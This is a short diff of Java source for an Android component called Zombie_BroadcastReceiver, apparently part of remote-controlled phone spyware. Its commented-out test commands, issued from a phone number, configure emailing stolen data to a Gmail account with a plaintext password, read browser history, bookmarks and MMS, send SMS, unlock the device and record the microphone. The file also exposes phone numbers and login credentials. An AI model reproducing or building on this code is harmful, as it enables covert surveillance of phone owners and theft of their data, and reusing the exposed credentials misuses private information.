@@ -44,12 +44,11 @@ public class Zombie_BroadcastReceiver extends BroadcastReceiver {
 			NetLog.v("Event %s will be %s",action,reply);
 		}
 		
-		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@setup smtp:smtp.gmail.com;port:465;user:eyeinsid3@gmail.com;pass:60175577a;mail:eyeinsid3@gmail.com;no sms;wifi",false));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@sms to:+79672243716;msg:Приет Мир !"));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@event unlock:1;power:1"));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get browser history"));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@get mms from:130710;to:130713",false));
-		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@spy browser bookmarks;history"));
+		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@mic time:10",false));
 		//mHandler.post(new CommandInvoker(context,mPool,"+79037996299","@keepalive time:2018",false));
 		//ContactsUtils d;
 	}
